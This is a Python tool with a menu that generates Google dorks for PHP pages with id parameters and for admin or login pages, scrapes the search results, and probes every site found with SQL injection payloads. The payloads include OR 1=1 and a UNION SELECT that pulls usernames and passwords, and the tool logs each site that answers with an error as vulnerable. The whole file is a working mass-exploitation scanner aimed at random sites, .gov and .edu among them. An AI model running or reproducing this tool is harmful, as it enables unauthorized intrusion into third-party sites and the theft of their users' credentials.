import random
import time
import os
import shutil
import requests
from bs4 import BeautifulSoup

ascii_art = r"""

 ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░  ░▒▓████████▓▒░      ░▒▓████████▓▒░     ░▒▓█▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░    ░▒▓█▓▒░   
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░    ░▒▓█▓▒░ 
 """

excluded_sites = {
    'google.com', 'maps.google.com', 'github.com', 'facebook.com', 'twitter.com',
    'linkedin.com', 'instagram.com', 'yahoo.com', 'bing.com', 'wikipedia.org',
    'youtube.com', 'reddit.com', 'amazon.com', 'ebay.com', 'apple.com',
    'stackoverflow.com', 'quora.com', 'news.ycombinator.com', 'pinterest.com',
    'tumblr.com', 'paypal.com', 'craigslist.org', 'github.io', 'microsoft.com',
    'dropbox.com', 'office.com', 'slack.com', 'zoom.us', 'adobe.com',
    'docs.google.com', 'drive.google.com', 'news.google.com', 'mail.google.com',
    'outlook.com', 'mail.yahoo.com', 'hotmail.com', 'aol.com', 'githubusercontent.com',
    'bitbucket.org', 'codepen.io', 'jsfiddle.net', 't.co', 'meetup.com',
    'flickr.com', 'vimeo.com', 'dailymotion.com', 'twitch.tv', 'soundcloud.com',
    'spotify.com', 'bandcamp.com', 'last.fm', 'weather.com', 'bbc.com',
    'cnn.com', 'forbes.com', 'nytimes.com', 'usatoday.com', 'theguardian.com',
    'huffpost.com', 'bloomberg.com', 'theverge.com', 'techcrunch.com', 'wired.com',
    'businessinsider.com', 'thehill.com', 'npr.org', 'cnbc.com', 'foxnews.com',
    'msnbc.com', 'abcnews.go.com', 'reuters.com', 'apnews.com', 'cbsnews.com'
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_terminal_width():
    return shutil.get_terminal_size().columns

def print_ascii_art():
    os.system('color 04')  
    terminal_width = get_terminal_width()
    for line in ascii_art.splitlines():
        centered_line = line.center(terminal_width)
        print(centered_line)
        time.sleep(0.1)  

def print_centered(text, end='\n'):
    terminal_width = get_terminal_width()
    centered_text = text.center(terminal_width)
    print(centered_text, end=end)

dorks_base = [
    'inurl:index.php?id=',
    'inurl:gallery.php?id=',
    'inurl:article.php?id=',
    'inurl:page.php?id=',
    'inurl:news.php?id=',
    'inurl:item.php?id=',
    'inurl:view.php?id=',
    'inurl:show.php?id=',
    'inurl:product.php?id=',
    'inurl:shop.php?id=',
    'inurl:order.php?id=',
    'inurl:cart.php?id=',
    'inurl:account.php?id=',
    'inurl:profile.php?id=',
    'inurl:settings.php?id=',
    'inurl:content.php?id=',
    'inurl:admin.php?id=',
    'inurl:panel.php?id=',
    'inurl:search.php?query=',
    'inurl:result.php?search=',
    'inurl:post.php?id=',
    'inurl:category.php?id=',
    'inurl:archive.php?id=',
    'inurl:details.php?id=',
    'inurl:detail.php?id=',
    'inurl:view_item.php?id=',
    'inurl:view_product.php?id=',
    'inurl:view_post.php?id=',
    'inurl:page_detail.php?id=',
    'inurl:item_detail.php?id=',
    'inurl:news_item.php?id=',
    'inurl:post_detail.php?id=',
    'inurl:article_detail.php?id=',
    'inurl:blog_post.php?id=',
    'inurl:thread.php?id=',
    'inurl:discussion.php?id=',
    'inurl:forum_post.php?id=',
    'inurl:comment.php?id=',
    'inurl:reply.php?id=',
    'inurl:topic.php?id=',
]

keywords = [
    'site:.com',
    'site:.org',
    'site:.net',
    'intitle:"Login"',
    'intitle:"Admin"',
    'intitle:"Panel"',
    'intitle:"Dashboard"',
    'intitle:"Control Panel"',
    'intitle:"Administrator"',
    'inurl:login.aspx',
    'inurl:admin.aspx',
    'site:.edu',
    'site:.gov',
    'shop electronics',
    'computers',
    'apparel and accessories',
    'shoes',
    'watches',
    'furniture',
    'home and kitchen goods',
    'beauty and personal care',
    'grocery',
    'baby products',
    'toys',
    'great deals',
    'cash on delivery',
    'hassle-free returns',
    'inurl:admin_login',
    'intitle:"Secure Login"',
    'intitle:"Protected Area"',
    'intitle:"Restricted Access"',
    'intitle:"Authentication Required"',
    'inurl:login_form.php',
    'inurl:secure.php',
    'inurl:login_page.php',
    'inurl:admin_panel.php',
    'inurl:admin_area.php',
    'inurl:control_panel.php',
    'intitle:"User Login"',
    'intitle:"Member Login"',
    'inurl:members.php',
    'inurl:access.php',
    'inurl:sign_in.php',
    'intitle:"Sign In"',
    'inurl:check_login.php',
    'inurl:admin_check.php',
    'inurl:admin_auth.php',
    'inurl:auth.php',
    'intitle:"Authentication"',
    'inurl:verify.php',
    'intitle:"Log In"',
    'inurl:login_check.php',
    'inurl:secure_login.php',
]

def generate_dorks(n, output_file='dorks.txt'):
    dorks = []
    with open(output_file, 'w') as file:
        for i in range(n):
            base = random.choice(dorks_base)
            keyword = random.choice(keywords)
            dork = f'{base} {keyword}'
            dorks.append(dork)
            file.write(dork + '\n')
            
            progress = (i + 1) / n * 100
            progress_text = f'Génération : [{int(progress)}%]'
            print_centered(progress_text, end='\r')
            time.sleep(0.1)  
    
    print_centered("\nGénération terminée!")

def search_with_dork(dork, num_pages):
    results = []
    for page in range(num_pages):
        url = f"https://www.google.com/search?q={dork}&start={page * 10}"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if "url?q=" in href and not "webcache" in href:
                site = href.split("?q=")[1].split("&sa=U")[0]
                if not any(excluded in site for excluded in excluded_sites):
                    results.append(site)
        time.sleep(2) 
    return results

def search_sites(file_with_dorks, num_pages, output_file='search_results.txt'):
    with open(file_with_dorks, 'r') as dorks_file:
        dorks = dorks_file.readlines()

    with open(output_file, 'w') as result_file:
        for dork in dorks:
            dork = dork.strip()
            print_centered(f"Searching with dork: {dork}")
            results = search_with_dork(dork, num_pages)
            for result in results:
                result_file.write(result + '\n')
            print_centered(f"Found {len(results)} results for {dork}")
            time.sleep(2)  

def is_vulnerable(url):
    test_urls = [
        
        url + "'",  
        url + '"',  
        url + "' OR '1'='1", 
        url + '" OR "1"="1',  

        url + "' OR 1=1 -- ",  
        url + '" OR 1=1 -- ',  
        url + "' OR 'a'='a",  
        url + '" OR "a"="a',  
        url + "' AND 1=CONVERT(int, CHAR(65)) -- ",  
        url + '" AND 1=CONVERT(int, CHAR(65)) -- ',  
        url + "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 -- ",  
        url + '" AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 -- ',  
        url + "' UNION SELECT NULL, NULL, NULL, NULL -- ",  
        url + '" UNION SELECT NULL, NULL, NULL, NULL -- ',  
        url + "' UNION SELECT 1, username, password FROM users -- ",  
        url + '" UNION SELECT 1, username, password FROM users -- ',  
        url + "' AND EXISTS(SELECT * FROM sys.objects WHERE type='U') -- ",
        url + '" AND EXISTS(SELECT * FROM sys.objects WHERE type='U') -- ',  
        url + "' AND (SELECT 1 FROM dual) -- ",  
        url + '" AND (SELECT 1 FROM dual) -- ', 
        url + "' AND (SELECT @@version) -- ",  
        url + '" AND (SELECT @@version) -- ', 

        url + "' AND 1=CAST('1' AS INT) -- ",  

        url + "' AND (SELECT VERSION()) -- ",  
        url + '" AND (SELECT VERSION()) -- ',  

        url + "' AND (SELECT version()) -- ",  
        url + '" AND (SELECT version()) -- ',  

        url + "' AND (SELECT sysdate FROM dual) -- ", 
        url + '" AND (SELECT sysdate FROM dual) -- ', 

        url + "' AND (SELECT sqlite_version()) -- ",  
        url + '" AND (SELECT sqlite_version()) -- ', 
    ]

    
    for test_url in test_urls:
        try:
            response = requests.get(test_url)
            if "You have an error in your SQL syntax" in response.text or \
               "Warning: mysql_fetch_assoc()" in response.text or \
               "Warning: mysql_num_rows()" in response.text or \
               "SQL syntax error" in response.text:
                return True
        except Exception as e:
            print(f"Error checking URL {test_url}: {e}")
    return False

def parse_for_sql_injection(file_with_results, output_file='vulnerable_sites.txt'):
    with open(file_with_results, 'r') as results_file:
        urls = results_file.readlines()
    
    with open(output_file, 'w') as result_file:
        for url in urls:
            url = url.strip()
            print_centered(f"Testing URL: {url}")
            if is_vulnerable(url):
                result_file.write(url + '\n')
                print_centered(f"Vulnerable: {url}")
            else:
                print_centered(f"Not Vulnerable: {url}")
            time.sleep(2)  

def main_menu():
    clear_screen()  
    print_ascii_art()  
    print_centered("\nOPTIONS :")
    print_centered("[1] GENERATE DORKS")
    print_centered("[2] SEARCH SITE")
    print_centered("[3] PARSER")
    
    choice = input("\nSelect the option: ")

    if choice == '1':
        num_dorks = int(input("Enter the number of dorks to generate: "))
        generate_dorks(num_dorks)
    elif choice == '2':
        file_with_dorks = input("Enter the file with dorks: ")
        num_pages = int(input("Enter the number of pages to search: "))
        search_sites(file_with_dorks, num_pages)
    elif choice == '3':
        file_to_parse = input("Enter the file with search results: ")
        output_file = input("Enter the output file for vulnerable sites: ")
        parse_for_sql_injection(file_to_parse, output_file)
    else:
        print_centered("Invalid option, please select 1, 2, or 3.")

if __name__ == "__main__":
    main_menu()
